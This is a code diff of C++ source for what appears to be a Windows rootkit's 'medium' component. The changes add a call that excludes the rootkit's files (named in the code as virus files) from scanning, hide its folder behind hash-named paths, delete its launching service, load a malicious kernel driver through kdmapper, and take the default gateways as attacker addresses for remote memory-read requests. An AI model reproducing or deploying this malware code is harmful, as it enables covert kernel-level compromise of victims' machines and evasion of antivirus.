@@ -118,7 +118,7 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 			case RKOP_READ:
 
 				// Read from process virtual memory:
-				OprResult = DriverCalls::ReadKernelCall(SndInfo.AsoSock, LocalRead, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
+				OprResult = DriverCalls::ReadKernelCall(SndInfo.AsoSock, &LocalRead, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
 				if (OprResult != 1) {
 					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
@@ -262,16 +262,16 @@ int main(int argc, char* argv[]) {
 	LogFile MediumLog = { 0 };
 	RETURN_LAST ReturnStatus = { 0 };
 	int MediumResult = 0;
-	const char* AttackAddresses = "172.17.80.1~192.168.1.32~192.168.56.1~192.168.192.1~192.168.88.1";
-	MediumLog.InitiateFile("C:\\nosusfolder\\verysus\\MediumLogFile.txt");
+	char* AttackerAddresses = NULL;
+	MediumLog.InitiateFile("C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MediumLogFile.txt");
+
+
+	// Create exclusion for virus files:
+	RootkitInstall::ExcludeRootkitFiles();
 
 
 	// Destroy launching service:
-	if (system("sc stop RootAuto > nul && sc delete RootAuto > nul") == -1) {
-		RequestHelpers::LogMessage("Cannot destroy launching service\n", &MediumLog, TRUE, GetLastError());
-		MediumLog.CloseLog();
-		return 0;
-	}
+	system("sc stop RootAuto > nul && sc delete RootAuto > nul");
 	RequestHelpers::LogMessage("Destroyed launching service!\n", &MediumLog, FALSE, 0);
 
 
@@ -284,12 +284,24 @@ int main(int argc, char* argv[]) {
 	RequestHelpers::LogMessage("Created control handler to handle reboots!\n", &MediumLog, FALSE, 0);
 
 
-	// Get IP addresses of target and attacker:
-	if (!address_config::MatchIpAddresses(MediumIP, ClientIP, AttackAddresses)) {
-		RequestHelpers::LogMessage("Cannot find the target address and the matching attacker address\n", &MediumLog, TRUE, GetLastError());
+	// Get the possible IP addresses for the attacker (in this case - all default gateways):
+	AttackerAddresses = RootkitInstall::GetGatewayList();
+	if (AttackerAddresses == NULL) {
+		RequestHelpers::LogMessage("Cannot get list of attacker IP addresses\n",
+			&MediumLog, TRUE, GetLastError());
 		MediumLog.CloseLog();
 		return 0;
 	}
+
+
+	// Get IP addresses of target and attacker:
+	if (!address_config::MatchIpAddresses(MediumIP, ClientIP, AttackerAddresses)) {
+		RequestHelpers::LogMessage("Cannot find the target address and the matching attacker address\n", &MediumLog, TRUE, GetLastError());
+		MediumLog.CloseLog();
+		free(AttackerAddresses);
+		return 0;
+	}
+	free(AttackerAddresses);
 	printf("Target: %s, Attacker: %s\n", MediumIP, ClientIP);
 
 
@@ -321,7 +333,10 @@ int main(int argc, char* argv[]) {
 
 
 	// Activate kdmapper with driver as parameter:
-	if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
+	if (system("C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\"
+			   "42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\kdmapper.exe "
+			   "C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\"
+			   "42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
 		RequestHelpers::LogMessage("Failed to activate service manager with driver as parameter\n", &MediumLog, TRUE, GetLastError());
 		MediumLog.CloseLog();
 		return 0;
@@ -367,7 +382,8 @@ int main(int argc, char* argv[]) {
 		if (PipeHandle != INVALID_HANDLE_VALUE) {
 			CloseHandle(PipeHandle);
 			PipeHandle = INVALID_HANDLE_VALUE;
-		}		return 0;
+		}
+		return 0;
 	}
 
 
